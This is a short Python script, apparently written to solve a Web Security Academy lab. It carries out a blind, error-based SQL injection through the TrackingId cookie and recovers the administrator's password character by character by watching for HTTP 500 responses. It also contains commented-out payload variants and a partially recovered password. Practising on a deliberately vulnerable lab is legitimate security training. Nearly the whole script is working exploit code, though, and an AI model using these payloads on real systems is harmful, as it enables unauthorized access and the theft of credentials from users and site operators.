import string
import requests
import time

url = "https://0a5e003d0445a677c0d31332003700b6.web-security-academy.net/"
#password = 'zjja8qtdakh6z86wv34'
#zjja8qtdakh6z86wv34f
#25
#index = 25
index = 1
password = ""

#‘ UNION SELECT CASE WHEN ( username=’administrator’ AND LENGTH(password) =1) THEN to_char(1/0) ELSE NULL END FROM users
#' UNION SELECT CASE WHEN (username='administrator' and ascii(substr(password,%s,1))= [CHAR])  THEN to_char(1/0) ELSE NULL END FROM users--;
#and (select substring(password,{index},1) from users where username='administrator')='{x}'--'
#and (select case when substr(password,1,1)='a' then_to_char(1/0) else '' end from users where username='administrator')--'
while True:
	for x in string.printable[0:36]:
		payload = f"IVSD6J3esyYWvsQM' || (select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and substr(password,{index},1)='{x}') || '"
		cookies = {
		"session": "f6TAMPJ2pQ91KEQvsrQqNjNOGyNMLVoI",
		"TrackingId": payload,
		}

		response = requests.get(url,cookies=cookies)
		print(payload)
		print((response.status_code))

		if response.status_code == 500:
			print(f"ketemu char {x}")
			password += str(x)
		elif response.status_code == 200:
			print("next")
		else:
			print("check password")
		#time.sleep(1)

	index += 1
	print(f"password sementara {password}")